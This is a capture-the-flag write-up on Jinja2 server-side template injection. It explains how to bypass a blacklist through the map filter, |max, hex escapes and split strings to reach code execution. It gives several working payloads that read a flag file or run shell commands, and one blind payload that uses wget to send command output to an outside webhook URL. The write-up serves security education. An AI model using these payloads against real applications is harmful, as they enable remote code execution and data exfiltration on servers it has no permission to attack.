# Description

This challenge was about acheiving SSTI rce with an abstract way of getting the attributes and builtins. The idea was inspired from the GDG Algiers CTF 2022.

I really loved the idea of using some abstract filter that can <i> "almost" </i> trully bypass any blacklist ( still need more research ) but the main thing is that we can now trully call any attribute using this trick and its rare that a blacklist would prevent you from using the ``map`` filter.

I just wanted it to be a bit harder so i added few more restrictions in my challenge, the same idea persists, but different method and with an extra step

https://github.com/GDGAlgiers/gdg-algiers-ctf-2022-writeups/tree/main/web/pipe-your-way

Shoutout to the authors of `pipe your way` in GDG i really enjoyed that challenge

## Brief solution

My solver using eval payload with lipsum:

```python

{{ lipsum.__globals__.__builtins__['eval']('open("/flag").read()')}}

```

Turned into :

```python

{% set exploit = ((lipsum,)|map(**{"at""tribute" : "\x5F\x5Fglo""bals\x5F\x5F"})|map(**{"at""tribute" : "\x5F\x5Fbui""ltins\x5F\x5F"})|map(**{"at""tribute" : "ev""al"})|max)("o""pen('/fl''ag')\x2Er""ead()") %}{%print(exploit)%}

```

TLDR;

1. using map() filter to get attributes

2. using {% %} to set and print the output since {{}} are blacklisted

3. using |max to get the specific attribute in eval

4. using hex encoding since _ is blacklisted.

5. using quotes trick to bypass filtered words


## Explanation on How to approach :

### Why (lipsum,) ?? 

In jinja or in python u can call multiple functions using () like this : (lipsum,config,cycler,) 

Be aware if u don't add `,` in the end it doesnt work.

### Why even bother to think of this? 

map only works on a an iterated object and since we defined a "tuple" with a lipsum we can choose to map just lipsum

### Why map? 

map is a filter used to access an attribute of an object. 

Example : 
```python

{{ users|map(attribute='username') }}

```

And since we can't apply an attribute directly (like this : ``map(attribute='test')`` ) because attr is filtered so using ``**kwargs`` we can specify we're mapping an attribute

now since all our payload attributes are gonna be inside quotes we can easily bypass the filter with just adding "" in the middle to split the string and using hex for the rest ( note u can use hex for all not just the _ )

thats still not enough...When using map some issues can happen

### WTF is ``|max`` ? 

Great question , so if you noticed i explicitly filtered out ``list`` and ``last`` , practically these do the same thing. let's investigate why ``max`` does the same thing as ``list|last`` in <b> our case </b> !!

let's try and work with this payload :

```lipsum.__globals__.__os__.__popen__('id').read()```

now let's trying using the map technique without max or list or last, stop at popen and see what happens.

Payload : 
```python

{% set x=((lipsum,)|map(**{"attribute" : "__globals__"})|map(**{"attribute" : "os"})|map(**{"attribute" : "popen"})) %} {%print(x)%}

```
	
Output : 
```python

<generator object sync_do_map at 0xfunction_number_here> 

```
	
The issue with map is that while we are trully mapping the attribute, we're not really calling popen, we're calling the map filter thats why you see "sync_do_map"

So how do we fix this?

A better way to understand this is to stop at globals, globals has bunch of attributes right? while os and popen is just one.

Let's try this :

Payload :  

```python

{% set x=((lipsum,)|map(**{"attribute":"__globals__"}))%}{%print(x)%}

```

output : 
```python

<generator object sync_do_map at 0xfunction_number>

```

Payload :  

```python

{% set x=((lipsum,)|map(**{"attribute":"__globals__"})|list)%}{%print(x)%}

```

output : 

```python 

[{'__name__': 'jinja2.utils', '__doc__': None, '__package__': 'jinja2', '__loader...

```

You see what happened now? we got a list the all the attributes, oke now what? still "max" doesnt make any sense..

Now you understand why we need something else other than map we move into popen

So we said popen has just one attribute right?

Yeah so let's try the list thing, same thing right? give us a list of the attributes, in this case just popen function.

Using list only wont completely work yet tho.. why? well to execute a function you have to call it, with just list we're calling the list itself and thats not a function

Payload:

```python

{% set x=((lipsum,)|map(**{"attribute" : "__globals__"})|map(**{"attribute" : "os"})|map(**{"attribute" : "popen"})|list) %}{%print(x)%}

```


Output:

```python

[<function popen at 0xfunction_number>]

```

Payload:

```python 

{% set x=((lipsum,)|map(**{"attribute" : "__globals__"})|map(**{"attribute" : "os"})|map(**{"attribute" : "popen"})|list|last) %}{%print(x)%}

```

Output:

```python 

<function popen at 0xfunction_number>

```

You see how the 'list' brackets are removed now? we directly accessed the popen function !!

Okey now we understand why ``list`` and ``last`` can help us but they're filtered right? :((

Yep! but we can use max! why? 

``max`` will simply return the longest item in a list, and since we have one item in the final attribute (popen) max will simply return that one item ( the popen function itself )

Now we simply use ``max`` instead of ``|list|last`` and we're done!

# Solutions

## ``lipsum`` solution :

```python 

{% set exploit = ((lipsum,)|map(**{"at""tribute" : "\x5F\x5Fglo""bals\x5F\x5F"})|map(**{"at""tribute" : "\x5F\x5Fbui""ltins\x5F\x5F"})|map(**{"at""tribute" : "ev""al"})|max)("o""pen('/fl''ag')\x2Er""ead()") %}{%print(exploit)%}

```

## ``cycler`` solution :

```python

cycler.__init__.__globals__.os.popen('ls').read()

```

Turned into :

```python 

{% set ex= ((cycler,)|map(**{"at""tribute" : "\x5F\x5Fin""it\x5F\x5F"})|map(**{"at""tribute" : "\x5F\x5Fglo""bals\x5F\x5F"})|map(**{"at""tribute" : "os"})|map(**{"at""tribute" : "popen"})|max)('id')%}{%print(ex|max)%} 

```

## Blind solution:

```python

cycler.__init__.__globals__.os.system('') 

```

since system doesnt print out the commands output and we can't use read() on it we go blind

```python

{% set ex= ((cycler,)|map(**{"at""tribute" : "\x5F\x5Fin""it\x5F\x5F"})|map(**{"at""tribute" : "\x5F\x5Fglo""bals\x5F\x5F"})|map(**{"at""tribute" : "os"})|map(**{"at""tribute" : "sy""st""em"})|max)('wget https://webhook.site/8cc2d187-a9df-401b-8f25-0fbf1dac5c33/?c=`c''at /fl''ag`')%}{%print(ex)%}

```
